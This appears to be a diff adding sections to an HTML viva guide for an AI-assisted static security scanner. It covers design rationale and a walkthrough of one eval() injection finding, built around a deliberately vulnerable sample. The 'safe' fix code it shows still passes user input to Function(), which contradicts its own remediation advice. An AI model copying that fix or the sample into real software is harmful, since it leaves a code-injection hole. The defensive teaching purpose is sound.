+    <p style="margin-top:.5rem"><strong>Reason:</strong> Prisma generates parameterised queries automatically — SQL injection is structurally impossible for all queries that go through it. It also provides TypeScript types for every model (no manual interface definitions), migration tooling (<code>prisma migrate</code>), and a readable query API. The schema-first approach means the database and TypeScript types stay in sync automatically.</p>
+  </div>
+  <div class="card">
+    <h4>Why NVIDIA NIM first in the fallback chain?</h4>
+    <p><strong>Chosen:</strong> NVIDIA → Gemini → OpenAI<br><strong>Rejected:</strong> OpenAI first / single provider</p>
+    <p style="margin-top:.5rem"><strong>Reason:</strong> NVIDIA NIM (Qwen3-235B) offers the highest model capability at the lowest cost per token for batch code analysis. Gemini 1.5 Flash is the speed/cost fallback — very fast and cheap. OpenAI GPT-4o-mini is the reliability fallback — most stable API SLA. Single provider creates a single point of failure; the fallback chain provides resilience without significant cost increase.</p>
+  </div>
+  <div class="card">
+    <h4>Why simple-git instead of child_process exec?</h4>
+    <p><strong>Chosen:</strong> <code>simple-git</code> npm library<br><strong>Rejected:</strong> <code>exec('git clone ...')</code></p>
+    <p style="margin-top:.5rem"><strong>Reason:</strong> Shell injection (CWE-78). If a user submits a malicious repo URL containing shell metacharacters (<code>;</code>, <code>&&</code>, <code>|</code>), <code>exec()</code> would execute them as shell commands. <code>simple-git</code> calls the git binary directly with arguments as an array — no shell involved, no injection possible. Security by design over sanitisation.</p>
+  </div>
+  <div class="card">
+    <h4>Why GitHub OAuth instead of password auth?</h4>
+    <p><strong>Chosen:</strong> GitHub OAuth2<br><strong>Rejected:</strong> Email/password with bcrypt</p>
+    <p style="margin-top:.5rem"><strong>Reason:</strong> Target users are developers who already have GitHub accounts. OAuth2 delegates credential management to GitHub (who have dedicated security teams, MFA enforcement, breach detection). We never store passwords — eliminating credential database breach risk entirely. Also provides a GitHub access token for cloning private repos without additional auth prompts.</p>
+  </div>
+  <div class="card">
+    <h4>Why three rate limit tiers?</h4>
+    <p><strong>Chosen:</strong> Global (1000/min) + Scan (5/hr) + AI Explain (10/min)<br><strong>Rejected:</strong> Single global rate limit</p>
+    <p style="margin-top:.5rem"><strong>Reason:</strong> Different endpoints have different costs. A static page request costs nanoseconds; an AI explanation call costs ~$0.01 and 2–3 seconds. A single limit either blocks legitimate browsing (too low) or allows AI cost abuse (too high). Tiered limits apply tighter constraints only where the cost is real — scan jobs (compute expensive) and AI calls (money expensive).</p>
+  </div>
+  <div class="card">
+    <h4>Why multi-stage Docker builds?</h4>
+    <p><strong>Chosen:</strong> Builder → Runner two-stage Dockerfile<br><strong>Rejected:</strong> Single-stage build</p>
+    <p style="margin-top:.5rem"><strong>Reason:</strong> Security and size. The builder stage needs compilers, TypeScript, all devDependencies — tools that are attack surface in production. The runner stage copies only compiled <code>dist/</code> and production <code>node_modules</code>. Result: ~60% smaller image, no TypeScript compiler in prod, no test frameworks, no build tools. Smaller attack surface = fewer CVEs in the final image.</p>
+  </div>
+</div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════
+     SECTION 17 — SINGLE VULNERABILITY DATA FLOW
+═══════════════════════════════════════════════════════ -->
+<section id="dataflow">
+<h2 class="section-title"><span class="num">17</span> End-to-End: One Vulnerability Finding</h2>
+<p style="color:var(--fg-muted);margin-bottom:1.5rem;font-size:.9rem">Trace a single <code>eval(userInput)</code> vulnerability from source code to UI dashboard. Every layer of the stack touched.</p>
+
+<div class="subsection">
+<h3>Step 1 — Trigger</h3>
+<div class="card">
+  <p>User submits GitHub repo URL <code>https://github.com/victim/app</code> via POST <code>/api/scans</code>. Backend creates a Scan record in PostgreSQL with <code>status = PENDING</code> and returns <code>{ scanId, status }</code>. Frontend opens SSE stream on <code>/api/scans/:id/stream</code>.</p>
+</div>
+</div>
+
+<div class="subsection">
+<h3>Step 2 — Queue Worker Picks Up Job</h3>
+<div class="card">
+  <p>Bull Queue worker dequeues the job. Calls <code>simpleGit().clone(repoUrl, '/tmp/sast-agent/scan-abc123')</code>. Updates Scan status to <code>CLONING</code>. SSE pushes <code>{ status: 'CLONING' }</code> to the browser — user sees progress bar update.</p>
+</div>
+</div>
+
+<div class="subsection">
+<h3>Step 3 — File Walker</h3>
+<div class="card">
+  <p>AiScannerService walks the cloned directory. Finds <code>src/utils/parser.js</code> (4.2KB — under 60KB limit). Reads file content. Status updates to <code>SCANNING</code>. The file contains:</p>
+  <pre><code>function parseInput(data) {
+  return eval(data.userQuery); // line 47
+}</code></pre>
+</div>
+</div>
+
+<div class="subsection">
+<h3>Step 4 — AI Analysis (NVIDIA NIM)</h3>
+<div class="card">
+  <p>AiService sends to NVIDIA NIM (Qwen3-235B) with a structured prompt containing the file content and security analysis instructions. NVIDIA responds with:</p>
+  <pre><code>{
+  "findings": [{
+    "ruleId": "javascript-eval-injection",
+    "title": "Dangerous eval() with user-controlled input",
+    "severity": "CRITICAL",
+    "lineStart": 47,
+    "cweId": "CWE-94",
+    "owaspId": "A03:2021",
+    "description": "eval() executes arbitrary JavaScript. User-controlled
+                    input passed to eval() allows remote code execution."
+  }]
+}</code></pre>
+  <p style="margin-top:.5rem">Worker waits 1.5 seconds (rate limit), then processes the next file.</p>
+</div>
+</div>
+
+<div class="subsection">
+<h3>Step 5 — Persist to Database</h3>
+<div class="card">
+  <pre><code>await prisma.issue.create({
+  data: {
+    scanId: scan.id,
+    userId: scan.userId,         // row-level ownership
+    ruleId: 'javascript-eval-injection',
+    title: 'Dangerous eval() with user-controlled input',
+    severity: 'CRITICAL',
+    filePath: 'src/utils/parser.js',
+    lineStart: 47,
+    cweId: 'CWE-94',
+    owaspId: 'A03:2021',
+    cvssScore: 9.8,
+    aiProcessed: false           // not yet enriched
+  }
+});</code></pre>
+</div>
+</div>
+
+<div class="subsection">
+<h3>Step 6 — AI Enrichment (Batch Phase)</h3>
+<div class="card">
+  <p>After all files are scanned, AiService runs the enrichment batch (5 issues at a time, 2 concurrent). For our <code>eval()</code> issue it calls the AI again with a deeper prompt requesting explanation + remediation + PoC. Response:</p>
+  <pre><code>{
+  "aiExplanation": "eval() treats its argument as JavaScript source code.
+    An attacker controlling data.userQuery can execute any code on the
+    server: read /etc/passwd, exfiltrate env vars, establish a reverse shell.",
+
+  "aiRemediation": "Replace eval() with a safe alternative. Use JSON.parse()
+    for JSON data, or a purpose-built expression parser (e.g., mathjs) for
+    arithmetic. Never pass user input to eval(), Function(), or setTimeout()
+    with a string argument.",
+
+  "aiFixCode": "function parseInput(data) {\n  // Safe: validate and parse\n
+    const allowed = /^[\\d+\\-*\\/()\\s]+$/.test(data.userQuery);\n
+    if (!allowed) throw new Error('Invalid input');\n
+    return Function('return ' + data.userQuery)();\n}"
+}</code></pre>
+  <p style="margin-top:.5rem">Issue updated: <code>aiProcessed = true</code>, all three AI fields populated.</p>
+</div>
+</div>
+
+<div class="subsection">
+<h3>Step 7 — Risk Score Computation</h3>
+<div class="card">
+  <p>Scan completes. Backend computes weighted risk score:</p>
+  <pre><code>// 1 Critical (weight 4) + 0 High + 2 Medium (weight 1) + 3 Low (weight 0.3)
+const raw = (1 * 4) + (0 * 2) + (2 * 1) + (3 * 0.3); // = 6.9
+const riskScore = Math.min((raw / maxPossible) * 100, 100);
+// Stored on scan record, displayed in dashboard</code></pre>
+  <p style="margin-top:.5rem">Scan status → <code>COMPLETED</code>. SSE pushes final event. Frontend redirects to results page.</p>
+</div>
+</div>
+
+<div class="subsection">
+<h3>Step 8 — UI Display</h3>
+<div class="card">
+  <p>React frontend calls <code>GET /api/scans/:id/issues?severity=CRITICAL</code>. TanStack Query caches the response. Issue renders as:</p>
+  <div style="background:var(--surface-inset);border:1px solid var(--border);border-left:3px solid var(--sev-critical);border-radius:var(--radius-md);padding:14px 16px;margin-top:.5rem">
+    <div style="display:flex;align-items:center;gap:.5rem;margin-bottom:.4rem">
+      <span class="sev sev-critical">Critical</span>
+      <strong style="color:var(--fg-strong);font-size:14px">Dangerous eval() with user-controlled input</strong>
+    </div>
+    <p style="color:var(--fg-subtle);font-size:12px;font-family:var(--font-mono)">src/utils/parser.js : line 47 &nbsp;|&nbsp; CWE-94 &nbsp;|&nbsp; A03:2021 &nbsp;|&nbsp; CVSS 9.8</p>
+    <p style="color:var(--fg-muted);font-size:.875rem;margin-top:.5rem">eval() executes arbitrary JavaScript. An attacker controlling data.userQuery can execute any code on the server...</p>
+  </div>
+  <p style="margin-top:.75rem">User clicks the issue → AI explanation, impact, PoC, remediation, and fix code all visible in the detail panel. The AI fix code is shown in a Monaco editor instance for easy copy-paste.</p>
+</div>
+</div>
+
+<div class="highlight">
+  <p><strong>Total elapsed time for this finding:</strong> Git clone (~5s) + file walk + AI scan (~2s per file with 1.5s delay) + enrichment batch (~3s per issue) + DB writes = roughly 15–30 seconds for a small repo. The user sees live progress throughout via SSE — the UI never looks frozen.</p>
+</div>
+</section>
+
+<div style="text-align:center;padding:3rem 0 2rem;color:var(--fg-subtle);font-size:.85rem;border-top:1px solid var(--border);margin-top:2rem">
   <p>SAST Security Copilot — VIVA Guide | Built with Node.js · React · PostgreSQL · Redis · AI</p>
   <p style="margin-top:.3rem">All diagrams powered by <a href="https://mermaid.js.org" style="color:var(--accent)">Mermaid.js</a></p>
 </div>
@@ -1677,16 +2676,18 @@ prisma.scan.findFirstOrThrow({
 function toggleTheme() {
   const html = document.documentElement;
   const btn = document.querySelector('.theme-btn');
-  if (html.getAttribute('data-theme') === 'dark') {
-    html.setAttribute('data-theme', 'light');
+  const isDark = html.classList.contains('theme-dark');
+  if (isDark) {
+    html.classList.remove('theme-dark');
+    html.classList.add('theme-light');
     btn.textContent = '🌙 Dark';
     mermaid.initialize({ theme: 'default', startOnLoad: false });
   } else {
-    html.setAttribute('data-theme', 'dark');
+    html.classList.remove('theme-light');
+    html.classList.add('theme-dark');
     btn.textContent = '☀️ Light';
     mermaid.initialize({ theme: 'dark', startOnLoad: false });
   }
-  // Re-render mermaid diagrams
   document.querySelectorAll('.mermaid').forEach(el => {
     const src = el.getAttribute('data-src') || el.innerHTML;
     el.setAttribute('data-src', src);
@@ -1706,9 +2707,12 @@ mermaid.initialize({
   theme: 'dark',
   startOnLoad: true,
   securityLevel: 'loose',
+  maxTextSize: 200000,
   flowchart: { useMaxWidth: true, htmlLabels: true },
   sequence: { useMaxWidth: true },
-  er: { useMaxWidth: true }
+  er: { useMaxWidth: true },
+  class: { useMaxWidth: true },
+  state: { useMaxWidth: true }
 });
 </script>
 </body>
